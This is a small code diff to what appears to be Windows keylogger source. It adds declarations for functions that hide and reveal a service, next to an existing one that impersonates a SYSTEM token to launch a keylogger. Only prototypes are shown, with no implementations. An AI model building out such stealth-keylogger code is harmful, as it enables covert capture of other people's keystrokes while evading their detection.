@@ -3,6 +3,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
+#include <sddl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
@@ -18,6 +19,8 @@ VOID StartSvc(SC_HANDLE SCManager);
 VOID StopSvc(SC_HANDLE SCManager);
 VOID DeleteSvc(SC_HANDLE SCManager);
 VOID UpdateSvc(SC_HANDLE SCManager);
+VOID HideSvc(SC_HANDLE SCManager);
+VOID ShowSvc(SC_HANDLE SCManager);
 
 VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, DWORD sessionID);
 VOID PrintUserNameByProc(void);
